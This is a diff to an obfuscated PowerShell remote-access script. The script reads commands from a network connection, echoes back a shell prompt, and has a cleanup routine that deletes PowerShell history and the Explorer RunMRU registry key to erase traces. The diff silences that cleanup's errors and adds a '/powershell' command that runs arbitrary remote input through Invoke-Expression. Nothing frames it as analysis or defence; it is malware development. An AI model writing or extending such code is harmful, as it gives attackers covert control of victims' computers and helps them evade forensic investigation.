@@ -23,12 +23,12 @@ function flipejsjiebsbllb($ibwjskwbnskieg) {
 }
 
 function kwhhabzbabjeikfn {
-    Remove-Item (Get-PSreadlineOption).HistorySavePath
-    Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -ErrorAction SilentlyContinue
 }
 
 function wuwudhbdbwb($String) {
-    [byte[]]$cc63f96fb8d24ff993ecd4f81ea1715c=0..$3aa2ad906c2b4439a6dee0a389abb6a.ReceiveBufferSize|ForEach-Object{0}
+    [byte[]]$cc63f96fb8d24ff993ecd4f81ea1715c=0..$3aa2ad906c2b4439a6dee0a389abb6ae.ReceiveBufferSize|ForEach-Object{0}
     $40762deaed16419582a9e2fa022f34cb.Write($String+'ffff> ')
     $40762deaed16419582a9e2fa022f34cb.Flush()
 }
@@ -44,7 +44,7 @@ while ($0abddb0134484e0ca2c951ce3e99f16c -ge 0) {
     if ($0abddb0134484e0ca2c951ce3e99f16c -gt 0) {
         $72b24f293ec941fabe2c084e41efcf4b = [System.Text.Encoding]::UTF8.GetString($cc63f96fb8d24ff993ecd4f81ea1715c, 0, $0abddb0134484e0ca2c951ce3e99f16c - 1)
 
-        # **TRIM input here to remove whitespace/newlines**
+        # Trim input to remove whitespace/newlines
         $72b24f293ec941fabe2c084e41efcf4b = $72b24f293ec941fabe2c084e41efcf4b.Trim()
 
         if ($72b24f293ec941fabe2c084e41efcf4b -match "^/discord\s+(.+)$") {
@@ -69,6 +69,15 @@ while ($0abddb0134484e0ca2c951ce3e99f16c -ge 0) {
             $bdubsiwiwnbdvank = "Executing cleanup.."
             wuwudhbdbwb($bdubsiwiwnbdvank)
             kwhhabzbabjeikfn
+        }
+        elseif ($72b24f293ec941fabe2c084e41efcf4b -match "^/powershell\s+(.+)$") {
+            $psCommand = $matches[1]
+            $output = try {
+                Invoke-Expression $psCommand 2>&1 | Out-String
+            } catch {
+                $_ | Out-String
+            }
+            wuwudhbdbwb($output)
         }
         else {
             $214a6b4cb6e043ab909aa13348235114 = try {
